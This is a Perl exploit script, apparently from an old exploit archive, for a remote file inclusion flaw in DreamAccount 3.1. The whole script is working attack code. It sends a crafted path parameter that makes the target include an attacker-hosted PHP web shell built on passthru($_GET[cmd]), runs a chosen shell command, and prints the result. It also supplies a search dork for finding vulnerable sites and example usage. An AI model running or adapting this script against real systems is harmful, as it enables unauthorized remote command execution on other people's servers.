#!/usr/bin/perl
use HTTP::Request;
use LWP::UserAgent;
print &quot;\n=============================================================================\r\n&quot;;
print &quot; * Dreamaccount Remote Command Execution  23/06/06 *\r\n&quot;;
print &quot;=============================================================================\r\n&quot;;
print &quot;[*] dork:\&quot;powered by DreamAccount 3.1\&quot;\n&quot;;
print &quot;[*] Coded By : Drago84 \n&quot;;
print &quot;[*] Discovered by CrAsH_oVeR_rIdE\n&quot;;
print &quot;[*] Use &lt;site&gt; &lt;dir_Dream&gt; &lt;eval site&gt; &lt;cmd&gt;\n&quot;;
print &quot; Into the Eval Site it must be:\n\n&quot;;
print &quot; Exclusive &lt;?php  passthru($_GET[cmd]); ?&gt; /Exclusive&quot;;

if (@ARGV &lt; 4)
{
print &quot;\n\n[*] usage: perl dream.pl &lt;site&gt; &lt;dir dream&gt; &lt;eval site&gt; &lt;cmd&gt;\n&quot;;
print &quot;[*] usage: perl dream.pl www.HosT.com /dreamaccount/ http://www.site.org/doc.jpg id\n&quot;;
print &quot;[*] uid=90(nobody) gid=90(nobody) egid=90(nobody) \n&quot;;
exit();
}
my $dir=$ARGV[1];
my $host=$ARGV[0];
my $eval=$ARGV[2];
my $cmd=$ARGV[3];
my $url2=$host.$dir.&quot;/admin/index.php?path=&quot;.$eval.&quot;?&amp;cmd=&quot;.$cmd;
print &quot;\n&quot;;
my $req=HTTP::Request-&gt;new(GET=&gt;$url2);
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;timeout(10);
my $response=$ua-&gt;request($req);
if ($response-&gt;is_success) {
print &quot;\n\nResult of:&quot;.$cmd.&quot;\n&quot;;
my ($pezzo_utile) = ( $response-&gt;content =~ m{Exclusive(.+)\/Exclusive}smx );
printf $1;
$response-&gt;content;
print &quot;\n&quot;;

}
